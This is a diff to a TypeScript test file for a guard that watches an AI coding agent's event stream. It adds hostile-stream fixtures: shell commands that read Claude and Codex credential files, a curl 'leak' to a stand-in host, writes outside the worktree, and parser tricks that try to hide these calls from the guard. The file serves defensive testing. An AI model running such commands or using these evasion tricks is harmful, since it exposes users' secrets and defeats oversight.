@@ -46,7 +46,12 @@
  * exit 3 with no `result` stay `PERMISSION_BLOCKED` when the call carried a Git write. `backing_provider` on `init`
  * does not wash that verdict. An own `__proto__` key beside an own string `command` does not replace it. A non-tool
  * `user_input` step before the call does not hide it. A command that arrives only on DONE, a swapped command and
- * `CommandLine` are replayed at exit 0 and at exit 1 in every blocked category. Lines that are not a tool step stay
+ * `CommandLine` are replayed at exit 0 and at exit 1 in every blocked category. Every blocked category also ends
+ * blocked at exit 2 and 137 with no `result` line, and the `#toolStep` fall-through paths are replayed: a null, array
+ * or string container skipped for a later one, a non-string `command` beside a `CommandLine` Git write, a command
+ * beside a path under a non-shell or empty tool name, a Git write swapped back to `ls` on DONE, `step_index` 0 or
+ * negative and fractional, a `step_index` reused after a benign `ls`, and a soft denial beside a guard verdict (as Grok
+ * Build T4.26). Lines that are not a tool step stay
  * `unknown`. A stream cut inside a line is not a hostile-category stream (the supervisor ends it
  * `OUTPUT_PROTOCOL_ERROR`); `antigravityPartialStreams` replays a cut before the hostile call and a cut after it, at
  * exit 0 and exit 1, in every blocked category. A valid tool step whose command is not an own string — a non-string, a
@@ -354,6 +359,35 @@ const gitForm = (
   exitCode,
   failureCode: "PERMISSION_BLOCKED",
   lines: [META(name, exitCode), INIT, ...shell(command), ...(exitCode === 0 ? [CLEAN_RESULT] : [])],
+});
+
+/** One raw tool `step_update` line; `fields` override or add to the defaults (step 1, ACTIVE, `run_command`). */
+const rawStep = (fields: Record<string, unknown>) =>
+  JSON.stringify({
+    event: "step_update",
+    conversation_id: SID,
+    step_index: 1,
+    state: "ACTIVE",
+    step_type: "tool",
+    tool_name: "run_command",
+    ...fields,
+  });
+
+/**
+ * A guarded stream whose tool step takes a parser fall-through path (`adapter.ts` `#toolStep`): a container or key the
+ * parser skips before it reaches the Git write. Exit 0 ends on a clean `SUCCESS` envelope.
+ */
+const fallThrough = (
+  name: string,
+  category: HostileStream["category"],
+  steps: string[],
+  exitCode = 0,
+): HostileStream => ({
+  name: `${name}${exitCode === 0 ? "" : `, exit ${exitCode}`}`,
+  category,
+  exitCode,
+  failureCode: "PERMISSION_BLOCKED",
+  lines: [META(name, exitCode), INIT, ...steps, ...(exitCode === 0 ? [CLEAN_RESULT] : [])],
 });
 
 /** Guarded stream ending in an `ERROR` envelope with no `denied_actions` at exit 1. */
@@ -1011,6 +1045,134 @@ const antigravityCase: AdapterLegCase = {
         }),
         ...shell(`cat ${fx.codexAuthPath} && ${GIT_WRITE}`),
         CLEAN_RESULT,
+      ],
+    },
+    // Exit codes other than 0, 1 and 3 (as Grok Build T4.26): 2 and 137 (a SIGKILL-style code) with no result line.
+    ...[2, 137].flatMap((exit) => [
+      guarded("shell read of a credential path", "credential_read", `cat ${fx.claudeCredentialsPath}`, exit),
+      guarded("shell write outside the worktree", "out_of_worktree_write", `touch ${fx.outsideSentinel}`, exit),
+      guarded("shell network call", "network", "curl https://example.invalid/leak", exit),
+    ]),
+    // Parser fall-through paths (`#toolStep`): a skipped container or key does not hide a later one.
+    fallThrough("credential read, tool_info.parameters null, command under tool_info.args", "credential_read", [
+      rawStep({
+        tool_info: {
+          name: "run_command",
+          parameters: null,
+          args: { command: `cat ${fx.claudeCredentialsPath} && ${GIT_WRITE}` },
+        },
+      }),
+    ]),
+    fallThrough(
+      "network call, tool_info.parameters an array, command under step parameters",
+      "network",
+      [
+        rawStep({
+          tool_info: { name: "run_command", parameters: ["ls"] },
+          parameters: { command: `curl https://example.invalid/leak && ${GIT_WRITE}` },
+        }),
+      ],
+      1,
+    ),
+    fallThrough("shell write, tool_info a string, command under step args.CommandLine", "out_of_worktree_write", [
+      rawStep({ tool_info: "run_command", args: { CommandLine: `touch ${fx.outsideSentinel} && ${GIT_WRITE}` } }),
+    ]),
+    fallThrough(
+      "credential read, non-string command beside a CommandLine Git write",
+      "credential_read",
+      [
+        rawStep({
+          tool_info: {
+            name: "run_command",
+            parameters: { command: 7, CommandLine: `cat ${fx.codexAuthPath} && ${GIT_WRITE}` },
+          },
+        }),
+      ],
+      1,
+    ),
+    fallThrough("shell write, command beside a path under a non-shell tool name", "out_of_worktree_write", [
+      rawStep({
+        tool_name: "write_to_file",
+        tool_info: {
+          name: "write_to_file",
+          parameters: { path: fx.outsideSentinel, command: `touch ${fx.outsideSentinel} && ${GIT_WRITE}` },
+        },
+      }),
+    ]),
+    fallThrough("network call under an empty tool name", "network", [
+      rawStep({
+        tool_name: "",
+        tool_info: { name: "", parameters: { command: `curl https://example.invalid/leak && ${GIT_WRITE}` } },
+      }),
+    ]),
+    fallThrough(
+      "credential read, Git write on ACTIVE swapped back to ls on DONE",
+      "credential_read",
+      [
+        rawStep({
+          tool_info: {
+            name: "run_command",
+            parameters: { command: `cat ${fx.claudeCredentialsPath} && ${GIT_WRITE}` },
+          },
+        }),
+        rawStep({ state: "DONE", tool_info: { name: "run_command", parameters: { command: "ls" } } }),
+      ],
+      1,
+    ),
+    fallThrough("network call, Git write swapped back to ls on DONE", "network", [
+      rawStep({
+        tool_info: {
+          name: "run_command",
+          parameters: { command: `curl https://example.invalid/leak && ${GIT_WRITE}` },
+        },
+      }),
+      rawStep({ state: "DONE", tool_info: { name: "run_command", parameters: { command: "ls" } } }),
+    ]),
+    fallThrough("shell write under step_index 0", "out_of_worktree_write", [
+      rawStep({
+        step_index: 0,
+        tool_info: { name: "run_command", parameters: { command: `touch ${fx.outsideSentinel} && ${GIT_WRITE}` } },
+      }),
+    ]),
+    fallThrough(
+      "network call under a negative, fractional step_index",
+      "network",
+      [
+        rawStep({
+          step_index: -1.5,
+          tool_info: {
+            name: "run_command",
+            parameters: { command: `curl https://example.invalid/leak && ${GIT_WRITE}` },
+          },
+        }),
+      ],
+      1,
+    ),
+    fallThrough("credential read, step_index reused after a benign ls", "credential_read", [
+      ...toolStep(1, "run_command", { command: "ls" }),
+      ...toolStep(1, "run_command", { command: `cat ${fx.claudeCredentialsPath} && ${GIT_WRITE}` }),
+    ]),
+    {
+      name: "shell write outside the worktree, soft-denied and chained with a Git write",
+      category: "out_of_worktree_write",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("a soft denial and a guard verdict in the same run", 0),
+        INIT,
+        ...shell(`touch ${fx.outsideSentinel} && ${GIT_WRITE}`),
+        deniedResult(DENIED_COMMAND),
+      ],
+    },
+    {
+      name: "only unknown event kinds, exit 2",
+      category: "unknown_events",
+      exitCode: 2,
+      failureCode: "TOOL_FAILURE",
+      lines: [
+        META("Event kinds below are invented; the adapter must report them unknown.", 2),
+        JSON.stringify({ event: "synthetic_unknown_kind", conversation_id: SID }),
+        JSON.stringify({ event: "step_update", step_type: "tool" }),
       ],
     },
     {
